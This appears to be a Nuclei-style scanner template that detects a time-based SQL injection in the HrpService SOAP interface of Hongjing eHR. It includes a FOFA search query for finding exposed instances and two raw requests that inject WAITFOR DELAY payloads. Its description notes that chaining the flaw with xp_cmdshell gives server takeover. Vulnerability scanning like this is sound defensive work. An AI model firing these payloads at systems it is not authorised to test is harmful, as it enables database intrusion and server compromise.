id: hjeHR-HrpService-sql-time

info:
  name: 宏景eHR HrpService SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="HJSOFT-HCM"
    宏景eHR HrpService 接口处存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
  reference:
    - https://mp.weixin.qq.com/s/-l7hS_l0QmiVjRsn9b4bNg
  tags: sql injection

http:
  - raw:
      - |
        POST /services/HrpService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
        <soapenv:Header/>
          <soapenv:Body>
              <hr:processResult>
                <arg0>1);WAITFOR DELAY '0:0:4'--</arg0>
                <arg1></arg1>
              </hr:processResult>
          </soapenv:Body>
        </soapenv:Envelope>
      - |
        POST /services/HrpService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
        <soapenv:Header/>
          <soapenv:Body>
              <hr:processResult>
                <arg0>1);WAITFOR DELAY '0:0:8'--</arg0>
                <arg1></arg1>
              </hr:processResult>
          </soapenv:Body>
        </soapenv:Envelope>
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and